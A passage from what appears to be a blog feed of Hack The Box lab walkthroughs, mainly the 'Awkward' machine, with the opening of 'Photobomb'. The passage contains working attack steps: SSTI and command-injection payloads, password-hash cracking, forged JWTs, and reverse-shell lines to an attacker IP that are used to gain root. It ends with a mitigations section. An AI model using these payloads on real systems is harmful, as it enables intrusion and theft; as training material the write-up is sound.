token. It was always returning a 200 with no content. I removed the token and got the same result.The API was taking a URL parameter. So I immediately thought I could get SSRF. I tried changing the URL to see what would happen. I sent ‚Äòhttp://hat-valley.htb‚Äô, this time the response contained the main site source code. I tried requesting other pages, but got blank responses. Requesting a JavaScript file worked. It looked like anything that required authentication failed. But still responded with a 200.I tried setting up a web server on my machine. I could use the status call to request it. I tried using redirects. It worked, but I got the same results as requesting the pages directly in the URL parameter.I also tried sending a page with multiple Server-Side Templating (SSTI) payloads taken from HackTricks. None of them worked.{{7*7}}${7*7}&lt;%= 7*7 %&gt;${{7*7}}#{7*7}*{7*7}engine.render(\"Hello {{\"+greeting+\"}}\", data)I thought that maybe there were other ports accessible only on the server. I scanned the ports again, this time with nmap, to see if it would detect any filtered port. It did not.Unauthenticated API CallI was going to write a small script to try requesting all the ports with the SSRF. But I decided to first add more notes on the different API calls. The fact that the status call was working without the token made me think that they were not all using the same code. And maybe some calls were not correctly protected.I went through all the API endpoints. I tried with my ‚Äòadmin‚Äô token, with a generated unsigned token, and without any token.When I got to the staff details endpoint, I got a nice surprise when I requested it without a token.GET /api/staff-details HTTP/1.1Host: hat-valley.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: application/json, text/plain, */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeReferer: http://hat-valley.htb/dashboardIt worked without the JWT.HTTP/1.1 200 OKServer: nginx/1.18.0 (Ubuntu)Date: Sun, 15 Jan 2023 12:10:29 GMTContent-Type: application/json; charset=utf-8Content-Length: 775Connection: closex-powered-by: Expressaccess-control-allow-origin: *etag: W/\"307-yT9RDkJOX+lsRRlC/J2nEu9d6Is\"[  {    \"user_id\": 1,    \"username\": \"christine.wool\",    \"password\": \"6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649\",    \"fullname\": \"Christine Wool\",    \"role\": \"Founder, CEO\",    \"phone\": \"0415202922\"  },  {    \"user_id\": 2,    \"username\": \"christopher.jones\",    \"password\": \"e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1\",    \"fullname\": \"Christopher Jones\",    \"role\": \"Salesperson\",    \"phone\": \"0456980001\"  },  {    \"user_id\": 3,    \"username\": \"jackson.lightheart\",    \"password\": \"b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436\",    \"fullname\": \"Jackson Lightheart\",    \"role\": \"Salesperson\",    \"phone\": \"0419444111\"  },  {    \"user_id\": 4,    \"username\": \"bean.hill\",    \"password\": \"37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f\",    \"fullname\": \"Bean Hill\",    \"role\": \"System Administrator\",    \"phone\": \"0432339177\"  }]Even better, it returned the password hashes as part of the payload. I saved them to a file and tried cracking them with hashcat.$ hashcat -a0 -m1400 --username hash.txt /usr/share/seclists/rockyou.txthashcat (v6.2.6) startingOpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]============================================================================================================================================* Device #1: pthread-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 2869/5803 MB (1024 MB allocatable), 6MCUMinimum password length supported by kernel: 0Maximum password length supported by kernel: 256Hashes: 4 digests; 4 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Optimizers applied:* Zero-Byte* Early-Skip* Not-Salted* Not-Iterated* Single-Salt* Raw-HashATTENTION! Pure (unoptimized) backend kernels selected.Pure kernels can crack longer passwords, but drastically reduce performance.If you want to switch to optimized kernels, append -O to your commandline.See the above message to find out about the exact limits.Watchdog: Temperature abort trigger set to 90cHost memory required for this attack: 1 MBDictionary cache hit:* Filename..: /usr/share/seclists/rockyou.txt* Passwords.: 14344384* Bytes.....: 139921497* Keyspace..: 14344384e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1:REDACTEDApproaching final keyspace - workload adjusted.Session..........: hashcatStatus...........: ExhaustedHash.Mode........: 1400 (SHA2-256)Hash.Target......: hash.txtTime.Started.....: Fri Jan 13 17:55:39 2023 (4 secs)Time.Estimated...: Fri Jan 13 17:55:43 2023 (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/usr/share/seclists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........:  4072.8 kH/s (0.35ms) @ Accel:512 Loops:1 Thr:1 Vec:8Recovered........: 1/4 (25.00%) Digests (total), 1/4 (25.00%) Digests (new)Progress.........: 14344384/14344384 (100.00%)Rejected.........: 0/14344384 (0.00%)Restore.Point....: 14344384/14344384 (100.00%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device GeneratorCandidates.#1....: $HEX[21217365786d652121] -&gt; $HEX[042a0337c2a156616d6f732103]Hardware.Mon.#1..: Util: 50%Started: Fri Jan 13 17:55:25 2023Stopped: Fri Jan 13 17:55:45 2023I had the password for ‚Äòchristopher.jones‚Äô. I tried the credentials in SSH, but they failed. I tried them on the sites. It worked on the main site but failed in the store.I had some potential usernames. So I launched Hydra to try to brute force the store login. It went through all rockyou without any success.Remote Code ExecutionOnce connected to the site, I tried the different API calls again. The status call worked the same way. I kept in mind that I still needed to use it to scan ports. But I kept exploring the other calls first.The call to get the leave requests were now returning two rows.bean.hill,Taking a holiday in Japan,23/07/2022,29/07/2022,Yesbean.hill,Inevitable break from Chris after Japan,14/08/2022,29/08/2022,NoThe call to submit new leave requests was sending the three fields in JSON. I tried using it to execute code on the server.POST /api/submit-leave HTTP/1.1Host: hat-valley.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: application/json, text/plain, */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/jsonContent-Length: 67Origin: http://hat-valley.htbConnection: closeReferer: http://hat-valley.htb/leaveCookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjczNjUwNzgzfQ.BmsL4d_9cvKe3dJKhW5XVio841FaYrvkfuO3iYlZKbs{\"reason\":\"`id` $(id); id\",\"start\":\"13/01/2023\",\"end\":\"13/01/2023\"}But some characters were rejected.HTTP/1.1 500 Internal Server ErrorServer: nginx/1.18.0 (Ubuntu)Date: Fri, 13 Jan 2023 23:02:10 GMTContent-Type: text/html; charset=utf-8Content-Length: 23Connection: closex-powered-by: Expressaccess-control-allow-origin: *etag: W/\"17-OzWJr/zG6kKdbqASHxkKlgUotLk\"Bad character detected.I did some experimentation and found that those characters were rejected:  ! # $ ? &amp; * ( ) &lt; &gt; [ ] { } ; ` | .But those were not:Sending a comma in my payload was very interesting.{  \"reason\":\"re,ason\",  \"start\":\"13/01/2023\",  \"end\":\"13/01/2023\"}It looked like the comma was used as a separator. With the name of the box hinting at the use of awk, I pushed more in that direction. There was a vulnerability in awk released a few months before the box. But I could not exploit it.I kept experimenting with the payload. And when I tried sending an object as the reason instead of a string, it got interesting.{  \"reason\":{},  \"start\":\"13/01/2023\",  \"end\":\"13/01/2023\"}The response contained an error.TypeError: reason.includes is not a function&lt;br&gt; &amp;nbsp; &amp;nbsp;at /var/www/hat-valley.htb/server/server.js:79:47&lt;br&gt; &amp;nbsp; &amp;nbsp;at Array.some (&amp;lt;anonymous&amp;gt;)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /var/www/hat-valley.htb/server/server.js:79:27&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15&lt;br&gt; &amp;nbsp; &amp;nbsp;at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12)&lt;br&gt; &amp;nbsp; &amp;nbsp;at next (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:280:10)The code was calling includes on the passed in reason. It was probably trying to look for the forbidden characters. I tried with an array.{  \"reason\":[],  \"start\":\"13/01/2023\",  \"end\":\"13/01/2023\"}This worked. And even better, the array allowed me to bypass the validation.{  \"reason\":[    \"reason$\"  ],  \"start\":\"13/01/2023\",  \"end\":\"13/01/2023\"}I tried using this to execute code and get a reverse shell.{  \"reason\":[    \"`bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.3/4444 0&gt;&amp;1'`\"  ],  \"start\":\"13/01/2023\",  \"end\":\"13/01/2023\"  }I got a hit on my netcat listener. And I was on the server.$ nc -klvnp 4444listening on [any] 4444 ...connect to [10.10.14.3] from (UNKNOWN) [10.10.11.185] 51432bash: cannot set terminal process group (1969): Inappropriate ioctl for devicebash: no job control in this shellwww-data@awkward:~/hat-valley.htb$ whoamiwhoamiwww-dataLateral MovementI looked around the server. I could not run sudo as www-data and I did not find any suid binary.The server.js code of the main application contained some credentials.const connection = mysql.createConnection({  host: 'localhost',  user: 'root',  password: 'REDACTED',  database: 'hatvalley',  stringifyObjects: true})const port = 3002const TOKEN_SECRET = \"REDACTED\"I connected to the database, but it only contained the username and password I already got through the API.The file /var/www/private/leave_requests.csv contained the leave requests from everyone.www-data@awkward:~/hat-valley.htb$ cat ../private/leave_requests.csvLeave Request Database,,,,,,,,HR System Username,Reason,Start Date,End Date,Approvedbean.hill,Taking a holiday in Japan,23/07/2022,29/07/2022,Yeschristine.wool,Need a break from Jackson,14/03/2022,21/03/2022,Yesjackson.lightheart,Great uncle's goldfish funeral + ceremony,10/05/2022,10/06/2022,Nojackson.lightheart,Vegemite eating competition,12/12/2022,22/12/2022,Nochristopher.jones,Donating blood,19/06/2022,23/06/2022,Yeschristopher.jones,Taking a holiday in Japan with Bean,29/07/2022,6/08/2022,Yesbean.hill,Inevitable break from Chris after Japan,14/08/2022,29/08/2022,Nochristopher.jones,,13/01/2023,14/01/2023,PendingThere were two home folders. One for christine that I could not read. And one for bean that had some readable files and folders.www-data@awkward:~/store$ ls -la /home/bean/total 84drwxr-xr-x 17 bean bean 4096 Oct  6 01:35 .drwxr-xr-x  4 root root 4096 Oct  5 02:46 ..lrwxrwxrwx  1 bean bean    9 Sep 15 21:40 .bash_history -&gt; /dev/null-rw-r--r--  1 bean bean  220 Sep 15 21:34 .bash_logout-rw-r--r--  1 bean bean 3847 Sep 15 21:45 .bashrcdrwx------  9 bean bean 4096 Sep 22 14:30 .cachedrwx------ 13 bean bean 4096 Oct  6 01:35 .configdrwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Desktopdrwxr-xr-x  3 bean bean 4096 Sep 15 21:46 Documentsdrwxr-xr-x  2 bean bean 4096 Sep 15 23:03 Downloadsdrwx------  2 bean bean 4096 Sep 22 14:24 .gnupgdrwx------  3 bean bean 4096 Sep 15 21:35 .localdrwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Musicdrwxrwxr-x  4 bean bean 4096 Oct  6 01:35 .npmdrwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Pictures-rw-r--r--  1 bean bean  807 Sep 15 21:34 .profiledrwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Publicdrwx------  4 bean bean 4096 Sep 15 21:55 snapdrwx------  2 bean bean 4096 Sep 15 21:36 .sshdrwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Templates-rw-r-----  1 root bean   33 Jan 14 23:22 user.txtdrwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Videoswww-data@awkward:~/store$ ls -la /home/bean/Desktop/total 8drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 .drwxr-xr-x 17 bean bean 4096 Oct  6 01:35 ..www-data@awkward:~/store$ ls -la /home/bean/Documents/total 16drwxr-xr-x  3 bean bean 4096 Sep 15 21:46 .drwxr-xr-x 17 bean bean 4096 Oct  6 01:35 ..drwxrwxr-x  2 bean bean 4096 Sep 15 21:46 backup-rwxrwxr-x  1 bean bean  369 Sep 15 21:45 backup_home.shwww-data@awkward:~/store$ ls -la /home/bean/Documents/backup/total 40drwxrwxr-x 2 bean bean  4096 Sep 15 21:46 .drwxr-xr-x 3 bean bean  4096 Sep 15 21:46 ..-rw-rw-r-- 1 bean bean 31715 Sep 15 21:46 bean_backup_final.tar.gzThe backup file was interesting. There were some files and folders I could not read. By extracting it, I thought I might be able to read bean‚Äôs SSH keys.www-data@awkward:~$ mkdir /tmp/test/www-data@awkward:~$ cd /tmp/test/www-data@awkward:/tmp/test$ cp /home/bean/Documents/backup/bean_backup_final.tar.gz .www-data@awkward:/tmp/test$ gunzip bean_backup_final.tar.gzwww-data@awkward:/tmp/test$ lsbean_backup_final.tarwww-data@awkward:/tmp/test$ tar -xf bean_backup_final.tarwww-data@awkward:/tmp/test$ lsbean_backup_final.tar  bean_backup.tar.gz  time.txtwww-data@awkward:/tmp/test$ cat time.txtThu 15 Sep 2022 21:46:25 AESTwww-data@awkward:/tmp/test$ gunzip bean_backup.tar.gzwww-data@awkward:/tmp/test$ tar -xf bean_backup.tarwww-data@awkward:/tmp/test$ lsbean_backup_final.tar  bean_backup.tar  Desktop  Documents  Downloads  Music  Pictures  Public  snap  Templates  time.txt  Videosww-data@awkward:/tmp/test$ ls -la .ssh/total 8drwx------  2 www-data www-data 4096 Sep 15 21:36 .drwxr-x--- 15 www-data www-data 4096 Sep 15 21:45 ..Sadly, there were no SSH keys in the backup. I looked at what it contained. I found the keyrings file in .local/share/keyrings/. I used John to crack it, the password was not in rockyou.I looked around the backup but did not find anything else at first. So I went back to looking in the server. The store site requires basic authentication. And that was not in the code. So I looked at the configuration of nginx.www-data@awkward:/home/bean$ cat /etc/nginx/sites-enabled/store.confserver {    listen       80;    server_name  store.hat-valley.htb;    root /var/www/store;    location / {        index index.php index.html index.htm;    }    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    location ~ /cart/.*\\.php$ {        return 403;    }    location ~ /product-details/.*\\.php$ {        return 403;    }    location ~ \\.php$ {        auth_basic \"Restricted\";        auth_basic_user_file /etc/nginx/conf.d/.htpasswd;        fastcgi_pass   unix:/var/run/php/php8.1-fpm.sock;        fastcgi_index  index.php;        fastcgi_param  SCRIPT_FILENAME  $realpath_root$fastcgi_script_name;        include        fastcgi_params;    }    # deny access to .htaccess files, if Apache's document root    # concurs with nginx's one    #    #location ~ /\\.ht {    #    deny  all;    #}}www-data@awkward:/home/bean$ cat /etc/nginx/conf.d/.htpasswdadmin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1The credentials to access the store were in a .htpasswd file. I had the username, but hashcat failed to break the password hash. I tried login in with all the passwords I had found so far, but still no luck.I downloaded pspy on the server to look at running processes.2023/01/15 04:00:01 CMD: UID=0    PID=32317  | /usr/sbin/CRON -f -P2023/01/15 04:00:01 CMD: UID=0    PID=32335  | /usr/sbin/postdrop -r2023/01/15 04:00:01 CMD: UID=0    PID=32334  | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem root2023/01/15 04:00:01 CMD: UID=0    PID=32328  | mail -s Leave Request: bean.hill christine2023/01/15 04:00:01 CMD: UID=0    PID=32336  | /usr/sbin/sendmail -oi -f root@awkward -t2023/01/15 04:00:01 CMD: UID=0    PID=32337  | /usr/sbin/sendmail -oi -f root@awkward -t2023/01/15 04:00:01 CMD: UID=0    PID=32338  | cleanup -z -t unix -u -c2023/01/15 04:00:01 CMD: UID=0    PID=32339  | trivial-rewrite -n rewrite -t unix -u -c2023/01/15 04:00:01 CMD: UID=0    PID=32340  | local -t unix2023/01/15 04:00:01 CMD: UID=???  PID=32344  | ???2023/01/15 04:00:01 CMD: UID=0    PID=32342  |2023/01/15 04:00:01 CMD: UID=0    PID=32346  | /bin/bash /root/scripts/notify.sh2023/01/15 04:00:01 CMD: UID=0    PID=32347  | /usr/lib/postfix/sbin/master -w2023/01/15 04:00:01 CMD: UID=0    PID=32348  | /usr/sbin/sendmail -oi -f root@awkward -t2023/01/15 04:00:01 CMD: UID=0    PID=32349  | /usr/sbin/postdrop -rThe mail command looked interesting, but it was running as root. And at that time I was trying to get in as bean or christine. So I took a note and left it aside.I went back to the backup and looked deeper into the hidden folders. Eventually, I came across what looked like the auto-save file for Xpad.www-data@awkward:/tmp/test$ cat .config/xpad/content-DS1ZS1TO DO:- Get real hat prices / stock from Christine- Implement more secure hashing mechanism for HR system- Setup better confirmation message when adding item to cart- Add support for item quantity &gt; 1- Implement checkout systemÓÄÄboldÓÄÄHR SYSTEMÓÄÄ/boldÓÄÄbean.hillREDACTEDhttps://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.htmlÓÄÄboldÓÄÄMAKE SURE TO USE THIS EVERYWHERE ^^^ÓÄÄ/boldÓÄÄIt contained a password and a bolded note to use it everywhere. I used it to connect to the store.And to SSH.$ ssh bean@targetbean@target's password:Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-52-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage0 updates can be applied immediately.The list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Sun Oct 23 21:38:08 2022 from 10.10.14.6bean@awkward:~$ ls -latotal 84drwxr-xr-x 17 bean bean 4096 Oct  6 01:35 .drwxr-xr-x  4 root root 4096 Oct  5 02:46 ..lrwxrwxrwx  1 bean bean    9 Sep 15 21:40 .bash_history -&gt; /dev/null-rw-r--r--  1 bean bean  220 Sep 15 21:34 .bash_logout-rw-r--r--  1 bean bean 3847 Sep 15 21:45 .bashrcdrwx------  9 bean bean 4096 Sep 22 14:30 .cachedrwx------ 13 bean bean 4096 Oct  6 01:35 .configdrwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Desktopdrwxr-xr-x  3 bean bean 4096 Sep 15 21:46 Documentsdrwxr-xr-x  2 bean bean 4096 Sep 15 23:03 Downloadsdrwx------  2 bean bean 4096 Sep 22 14:24 .gnupgdrwx------  3 bean bean 4096 Sep 15 21:35 .localdrwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Musicdrwxrwxr-x  4 bean bean 4096 Oct  6 01:35 .npmdrwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Pictures-rw-r--r--  1 bean bean  807 Sep 15 21:34 .profiledrwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Publicdrwx------  4 bean bean 4096 Sep 15 21:55 snapdrwx------  2 bean bean 4096 Sep 15 21:36 .sshdrwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Templates-rw-r-----  1 root bean   33 Jan 14 23:22 user.txtdrwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Videosbean@awkward:~$ cat user.txtREDACTEDPrivilege EscalationOnce connected as bean, I thought I needed to find a way to access the user christine. I looked at sudo, suid, cronjobs, ‚Ä¶ I did not find anything.I read the source code of the store application. It had similar code to deny the use of some characters. And it was using sed in the code to remove items from the cart.I saw that I could create new products by adding files to the product-details folder. So I thought maybe I could inject code in there, and get it executed when sed was called. But the application was running as www-data, so I left that aside and looked for other things.Email SendingI ran pspy again, and the process that sent the emails keep coming back.2023/01/16 00:40:01 CMD: UID=0    PID=4201   | /usr/sbin/sendmail -oi -f root@awkward -t 2023/01/16 00:40:01 CMD: UID=0    PID=4204   | /usr/sbin/postdrop -r 2023/01/16 00:40:01 CMD: UID=0    PID=4203   | /usr/sbin/postdrop -r 2023/01/16 00:40:01 CMD: UID=0    PID=4202   | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem root 2023/01/16 00:40:01 CMD: UID=0    PID=4205   | cleanup -z -t unix -u -c 2023/01/16 00:40:01 CMD: UID=0    PID=4206   | trivial-rewrite -n rewrite -t unix -u -c 2023/01/16 00:40:01 CMD: UID=0    PID=4207   | /bin/bash /root/scripts/notify.sh 2023/01/16 00:40:01 CMD: UID=0    PID=4212   | mail -s Leave Request: bean.hill christine 2023/01/16 00:40:01 CMD: UID=0    PID=4214   | local -t unix 2023/01/16 00:40:01 CMD: UID=0    PID=4213   | cleanup -z -t unix -u -c 2023/01/16 00:40:01 CMD: UID=0    PID=4215   | /usr/sbin/sendmail -oi -f root@awkward -t 2023/01/16 00:40:01 CMD: UID=0    PID=4217   | local -t unix 2023/01/16 00:40:01 CMD: UID=0    PID=4216   | /usr/sbin/postdrop -r It took me a while, but eventually, I realized that the subject of the email contained the username of the requester (Leave Request: bean.hill christine), and that I could control that.When I first got a shell on the machine, I found the TOKEN_SECRET that was used to generate JWT. I took my token to jwt.io to confirm that it worked.I tried generating a token with a fake name to see if it would be used in the mail command. I used Burp to send a leave request with my new token and checked what was executed on the server.2023/01/16 01:02:46 CMD: UID=0    PID=4320   | mail -s Leave Request: ERIC_WAS_HERE christineIt worked! Next, I tried to send some code to execute.{  \"username\": [\";`id`;ls\"],  \"iat\": 1673727191}I sent a username with some commands to execute. The id was run, but on insertion by www-data. Not by root when sending the email. So that did not help.mail -s Leave Request: ;uid=33(www-data) gid=33(www-data) groups=33(www-data);ls christineI needed something that would be executed by mail, not the web server. I found on GTFOBins that mail could be used to run commands.I struggled a lot to get the payload executed. In the end, I had to double-encode everything, and start with a single \".I created a script on the server and made it executable.bean@awkward:~$ cat /tmp/test.sh#!/bin/bashbash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.3/4444 0&gt;&amp;1'Then I sent a username that would use --exec on the mail command to run the script.{  \"username\": [\"\\\\\\\" --exec=\\\\\\\"\\\\!/tmp/test.sh\\\\\\\"\"],  \"iat\": 1673727191}I sent a new request with the generated JWT and I got a hit on my listener.$ nc -klvnp 4444listening on [any] 4444 ...connect to [10.10.14.3] from (UNKNOWN) [10.10.11.185] 35700bash: cannot set terminal process group (946): Inappropriate ioctl for devicebash: no job control in this shellroot@awkward:~/scripts# whoamiwhoamirootroot@awkward:~/scripts# cat /root/root.txtcat /root/root.txtREDACTEDAfter I finally got root, I realized that I could have done the same when I got the shell as www-data. The file used to store the leave requests is writable by www-data. So I could add the command to the file and get my shell.echo ' \" --exec=\"!/tmp/test.sh\"' &gt;&gt; /var/www/private/leave_requests.csvMitigationsThis box was made vulnerable by a series of mistakes, mostly in the main application.The source maps are great for developers, but they should not be available in production. They also make life easier for hackers.The token validation was problematic. If the token was not set to guest, then I could access pages that should have been protected. The code should always validate the full token and reject any requests with an invalid token.The API endpoint to check the store status had no reason to take a URL parameter. The developers should know where the store would be. If they need multiple URLs for different environments, that could be stored in an environment variable instead of allowing the users to query anything they want.The staff-details endpoint was problematic.app.get('/api/staff-details', (req, res) =&gt; {  const user_token = req.cookies.token  var authFailed = false  if(user_token) {    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)    if(!decodedToken.username) {      authFailed = true    }  }  if(authFailed) {    return res.status(401).json({Error: \"Invalid Token\"})  }  connection.query(    'SELECT * FROM users',    function (err, results) {      if(err) {        return res.status(500).send(\"Database error\")      }      else {        return res.status(200).json(results)      }    }  );})If user_token was not defined, then authFailed stayed false and we could access all the users. In authentication code, the default should always be a failure until proven that the authentication is successful. This way call is rejected in the case of a forgotten path like here.Sending the data directly from the database is a bad idea. The code should go through the users and only send the fields that are needed. This way you don‚Äôt risk sending sensitive data like the password hashes, even if it‚Äôs added after the code was written.The way the leave requests were stored also has issues. The code uses the command line to echo the entries in a file and read them. Passing user-supplied values to the command line is always risky. The code tries to reject some characters, but that‚Äôs clearly not enough. Validating the types of the arguments would have helped.The application already has a database to store users. Why not use it for leave requests also? And if the requests needed to be stored in a file, why not use the Node methods to read and write to files?Once connected, I was able to read the backup of another user. Backups can contain sensitive data and should be protected. The file should not be readable by anyone but the owner. And maybe they could be encrypted.There was also an issue with bean‚Äôs password. They entered it in a clear text document. Xpad saved it in clear. I don‚Äôt know it that was an auto-save file, or where it saves all the notes, but passwords cannot be entered in an unencrypted document. And they should not be reused.The last problem was with the code that sent the email when a new leave request was added.root@awkward:~/scripts# cat notify.shcat notify.sh#!/bin/bashinotifywait --quiet --monitor --event modify /var/www/private/leave_requests.csv | while read; do        change=$(tail -1 /var/www/private/leave_requests.csv)        name=`echo $change | awk -F, '{print $1}'`        echo -e \"You have a new leave request to review!\\n$change\" | mail -s \"Leave Request: \"$name christineOnce again, user‚Äôs data is used in a command. This code probably takes for granted that the data was sanitized by the code that wrote it to the file. But you should always sanitize the inputs where you use them. Don‚Äôt trust other code to do it for you. You never know how it can be bypassed."
  },
  
  {
    "title": "Hack The Box - Photobomb",
    "url": "/posts/HackTheBox-Walkthrough-Photobomb/",
    "categories": "",
    "tags": "Walkthrough, Hacking, HackTheBox, Easy, Machine",
    "date": "2023-02-11 00:00:00 +0800",
    





    
    "snippet": "In this easy box, I had to exploit a web application that allowed reformatting images to get remote code execution. Then I got root by exploiting a cleanup script with too many permissions.  Room: ...",
    "content": "In this easy box, I had to exploit a web application that allowed reformatting images to get remote code execution. Then I got root by exploiting a cleanup script with too many permissions.  Room: Photobomb  Difficulty: Easy  URL: https://app.hackthebox.com/machines/Photobomb  Author: slartibartfastEnumerationI first launched RustScan to look for opened ports on the server.$ rustscan -a target -- -v | tee rust.txt.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| || .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy           :: https://github.com/RustScan/RustScan : --------------------------------------Real hackers hack time ‚åõ[~] The config file is expected to be at \"/home/ehogue/.rustscan.toml\"[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.Open 10.129.46.4:22Open 10.129.46.4:80[~] Starting Script(s)[&gt;] Script to be run Some(\"nmap -vvv -p  \")[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-15 16:48 EDTInitiating Ping Scan at 16:48Scanning 10.129.46.4 [2 ports]Completed Ping Scan at 16:48, 0.03s elapsed (1 total hosts)Initiating Connect Scan at 16:48Scanning target (10.129.46.4) [2 ports]Discovered open port 22/tcp on 10.129.46.4Discovered open port 80/tcp on 10.129.46.4Completed Connect Scan at 16:48, 0.02s elapsed (2 total ports)Nmap scan report for target (10.129.46.4)Host is up, received syn-ack (0.025s latency).Scanned at 2022-10-15 16:48:25 EDT for 0sPORT   STATE SERVICE REASON22/tcp open  ssh     syn-ack80/tcp open  http    syn-ackRead data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 0.11 secondsOnly ports 22 (SSH) and 80 (HTTP) were open.WebsiteI opened a browser and navigated to the machine IP. I was redirected to ‚Äòhttp://photobomb.htb/‚Äô. I added ‚Äòphotobomb.htb‚Äô to my hosts file and reloaded the page.Since the box had a domain name, I looked for subdomains but did not find anything.$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -t30 --hw 10 -H \"Host:FUZZ.photobomb.htb\" \"http://photobomb.htb/\" /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://photobomb.htb/Total requests: 648201=====================================================================ID           Response   Lines    Word       Chars       Payload=====================================================================I also launched Feroxbuster to look for hidden pages.$ feroxbuster -u http://photobomb.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -o ferox.txt ___  ___  __   __     __      __         __   ___|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___by Ben \"epi\" Risher ü§ì                 ver: 2.7.1‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ üéØ  Target Url            ‚îÇ http://photobomb.htb/ üöÄ  Threads               ‚îÇ 50 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt üëå  Status Codes          ‚îÇ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] üí•  Timeout (secs)        ‚îÇ 7 ü¶°  User-Agent            ‚îÇ feroxbuster/2.7.1 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml üíæ  Output File           ‚îÇ ferox.txt üèÅ  HTTP methods          ‚îÇ [GET] üîÉ  Recursion Depth       ‚îÇ 